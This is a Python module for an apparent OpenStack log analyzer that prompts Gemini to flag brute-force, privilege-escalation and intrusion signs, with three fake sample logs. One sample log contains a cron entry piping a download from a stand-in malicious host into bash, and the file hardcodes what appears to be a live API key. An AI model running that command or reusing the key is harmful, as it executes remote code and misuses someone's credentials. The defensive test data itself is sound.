"""
ai_analyzer.py — Cloud Sentinel AI Module
==========================================
Uses the Google Gemini API to analyze OpenStack instance logs
and detect security anomalies such as brute-force attacks,
privilege escalation, suspicious processes, and intrusion signs.
"""

import google.generativeai as genai

# ---------------------------------------------------------------------------
# Configuration — Replace with your real Gemini API key before running
# ---------------------------------------------------------------------------
API_KEY = "AIzaSyAtaNZ0BiGnRQujxmeiXe9iCGKT_h4WmPU"
genai.configure(api_key=API_KEY)


# ---------------------------------------------------------------------------
# FUNCTION: analyze_log_with_ai
# ---------------------------------------------------------------------------
def analyze_log_with_ai(log_text, instance_name="Unknown"):
    """
    Send an instance log to Gemini and get a structured security analysis.

    Parameters:
        log_text      (str): Raw log content from the OpenStack instance.
        instance_name (str): Human-readable name for the instance (for context).

    Returns:
        dict: Parsed result with keys:
              instance, anomaly_found, severity, findings,
              recommendation, raw_response
    """
    # Build a strict, structured prompt so Gemini returns parseable output
    prompt = f"""You are a cloud security expert specializing in OpenStack environments.
Analyze the following instance log from '{instance_name}' and detect any security anomalies.

Look specifically for:
- Failed SSH login attempts (brute force)
- Unauthorized sudo or privilege escalation attempts
- Suspicious processes or services starting unexpectedly
- Unusual outbound network connections
- Repeated error patterns that suggest probing or exploitation
- Any other signs of intrusion or system compromise

Respond in EXACTLY this format. No markdown, no extra text, no code blocks:
ANOMALY_FOUND: yes/no
SEVERITY: High/Medium/Low/None
FINDINGS:
- finding one
- finding two
RECOMMENDATION: one sentence describing what the admin should do

--- INSTANCE LOG START ---
{log_text}
--- INSTANCE LOG END ---
"""

    try:
        model = genai.GenerativeModel("gemini-1.5-flash")
        response = model.generate_content(prompt)
        raw_text = response.text
        return parse_ai_response(raw_text, instance_name)

    except Exception as e:
        # Return a safe error dict instead of crashing the whole scan
        return {
            "instance":      instance_name,
            "anomaly_found": False,
            "severity":      "Unknown",
            "findings":      [f"API error: {str(e)}"],
            "recommendation": "Check your API key and network connection.",
            "raw_response":  str(e),
            "error":         True
        }


# ---------------------------------------------------------------------------
# FUNCTION: parse_ai_response
# ---------------------------------------------------------------------------
def parse_ai_response(response_text, instance_name):
    """
    Parse Gemini's structured text response into a Python dictionary.

    Handles edge cases where the model doesn't follow the exact format
    by falling back to safe default values.

    Parameters:
        response_text (str): Raw text returned by Gemini.
        instance_name (str): Name of the instance being analyzed.

    Returns:
        dict: Structured result dictionary.
    """
    result = {
        "instance":       instance_name,
        "anomaly_found":  False,
        "severity":       "None",
        "findings":       [],
        "recommendation": "No recommendation available.",
        "raw_response":   response_text,
        "error":          False
    }

    lines = response_text.strip().splitlines()
    in_findings = False

    for line in lines:
        stripped = line.strip()

        # --- ANOMALY_FOUND ---
        if stripped.upper().startswith("ANOMALY_FOUND:"):
            value = stripped.split(":", 1)[1].strip().lower()
            result["anomaly_found"] = value == "yes"
            in_findings = False

        # --- SEVERITY ---
        elif stripped.upper().startswith("SEVERITY:"):
            value = stripped.split(":", 1)[1].strip().capitalize()
            # Normalize to known values; default to "Unknown" if unrecognised
            if value in ("High", "Medium", "Low", "None"):
                result["severity"] = value
            else:
                result["severity"] = "Unknown"
            in_findings = False

        # --- FINDINGS block header ---
        elif stripped.upper().startswith("FINDINGS:"):
            in_findings = True
            # Anything on the same line after the colon is the first finding
            inline = stripped.split(":", 1)[1].strip()
            if inline and inline != "-":
                result["findings"].append(inline.lstrip("- ").strip())

        # --- RECOMMENDATION ---
        elif stripped.upper().startswith("RECOMMENDATION:"):
            result["recommendation"] = stripped.split(":", 1)[1].strip()
            in_findings = False

        # --- Bullet points inside FINDINGS block ---
        elif in_findings and stripped.startswith("-"):
            finding = stripped.lstrip("- ").strip()
            if finding:
                result["findings"].append(finding)

    # Fallback if findings list is still empty
    if not result["findings"]:
        result["findings"] = ["No specific findings extracted from response."]

    return result


# ---------------------------------------------------------------------------
# FUNCTION: get_sample_logs
# ---------------------------------------------------------------------------
def get_sample_logs():
    """
    Return a dictionary of 3 fake OpenStack instance logs for demo/testing.
    Used when MicroStack is not available (offline / Windows dev mode).

    Returns:
        dict: {instance_name: log_text}
    """
    return {
        # ----------------------------------------------------------------
        # instance-001: Multiple failed SSH logins — clearly suspicious
        # ----------------------------------------------------------------
        "instance-001": """
May 04 01:12:44 sshd[4821]: Failed password for root from 192.168.1.105 port 54312 ssh2
May 04 01:12:46 sshd[4821]: Failed password for root from 192.168.1.105 port 54312 ssh2
May 04 01:12:49 sshd[4821]: Failed password for root from 192.168.1.105 port 54312 ssh2
May 04 01:12:51 sshd[4821]: Failed password for root from 192.168.1.105 port 54312 ssh2
May 04 01:12:53 sshd[4821]: Failed password for root from 192.168.1.105 port 54312 ssh2
May 04 01:12:55 sshd[4822]: Failed password for ubuntu from 192.168.1.105 port 54400 ssh2
May 04 01:12:57 sshd[4822]: Failed password for ubuntu from 192.168.1.105 port 54400 ssh2
May 04 01:13:02 sshd[4822]: Failed password for ubuntu from 192.168.1.105 port 54400 ssh2
May 04 01:13:10 sshd[4823]: Accepted password for ubuntu from 10.0.0.2 port 22 ssh2
May 04 01:13:10 sshd[4824]: pam_unix(sshd:session): session opened for user ubuntu
May 04 01:15:00 kernel: iptables: unexpected outbound connection to 45.33.32.156:443
May 04 01:15:05 systemd: Started unknown service: /tmp/.hidden_service
""",

        # ----------------------------------------------------------------
        # instance-002: Clean, healthy log — nothing suspicious
        # ----------------------------------------------------------------
        "instance-002": """
May 04 08:00:01 CRON[1234]: (root) CMD (/usr/lib/neutron/neutron-cleanup)
May 04 08:05:00 systemd[1]: Started OpenStack Nova Compute.
May 04 08:10:00 nova-compute[5678]: INFO nova.compute.manager Instance status: ACTIVE
May 04 08:15:00 sshd[9101]: Accepted publickey for ubuntu from 10.0.0.1 port 22 ssh2
May 04 08:15:01 sshd[9102]: pam_unix(sshd:session): session opened for user ubuntu
May 04 08:30:00 kernel: eth0: no IPv6 routers present
May 04 09:00:01 CRON[2345]: (root) CMD (/usr/bin/apt-get update -qq)
May 04 09:05:00 systemd[1]: Reloading OpenStack Cinder Volume.
May 04 09:10:00 cinder-volume[6789]: INFO cinder.volume.manager Volume status: available
""",

        # ----------------------------------------------------------------
        # instance-003: Sudo abuse and privilege escalation attempts
        # ----------------------------------------------------------------
        "instance-003": """
May 04 03:22:10 sshd[7731]: Accepted password for devuser from 10.0.0.9 port 22 ssh2
May 04 03:22:15 sudo[7801]: devuser : command not allowed ; TTY=pts/0 ; PWD=/home/devuser ; USER=root ; COMMAND=/bin/bash
May 04 03:22:20 sudo[7802]: devuser : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/devuser ; USER=root ; COMMAND=/usr/bin/passwd root
May 04 03:22:30 sudo[7803]: devuser : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/usr/sbin/useradd -m attacker
May 04 03:22:45 kernel: audit: type=1400 audit(1714780965.220:56): apparmor="DENIED" operation="exec" profile="unconfined" name="/usr/bin/nc"
May 04 03:23:00 sshd[7900]: Disconnected from user devuser 10.0.0.9 port 22
May 04 03:23:05 sudo[7901]: pam_unix(sudo:auth): authentication failure; logname=devuser uid=1001 euid=0
May 04 03:25:00 cron[7950]: (devuser) REPLACE (devuser)
May 04 03:25:01 cron[7951]: devuser@instance-003: /bin/bash -c 'curl http://malicious.example.com/payload | bash'
"""
    }


# ---------------------------------------------------------------------------
# FUNCTION: analyze_all_instances
# ---------------------------------------------------------------------------
def analyze_all_instances(logs_dict):
    """
    Run AI analysis on every instance log in the provided dictionary.

    Parameters:
        logs_dict (dict): {instance_name: log_text}

    Returns:
        list[dict]: One result dictionary per instance.
    """
    results = []

    for instance_name, log_text in logs_dict.items():
        print(f"  Analyzing {instance_name}...")
        result = analyze_log_with_ai(log_text, instance_name)
        results.append(result)

    return results


# ---------------------------------------------------------------------------
# CLI entry point — demo run using sample logs
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("\n" + "=" * 55)
    print("  Cloud Sentinel — AI Log Analyzer (Demo Mode)")
    print("=" * 55)
    print("  Using sample logs (MicroStack not required)\n")

    sample_logs = get_sample_logs()
    results = analyze_all_instances(sample_logs)

    print("\n" + "=" * 55)
    print("  ANALYSIS RESULTS")
    print("=" * 55)

    for r in results:
        status_icon = "🚨" if r["anomaly_found"] else "✅"
        print(f"\n{status_icon}  Instance   : {r['instance']}")
        print(f"   Anomaly    : {'YES' if r['anomaly_found'] else 'NO'}")
        print(f"   Severity   : {r['severity']}")
        print(f"   Findings   :")
        for finding in r["findings"]:
            print(f"     - {finding}")
        print(f"   Recommend  : {r['recommendation']}")
        if r.get("error"):
            print(f"   [!] Error occurred — check API key / connection")

    print("\n" + "=" * 55 + "\n")
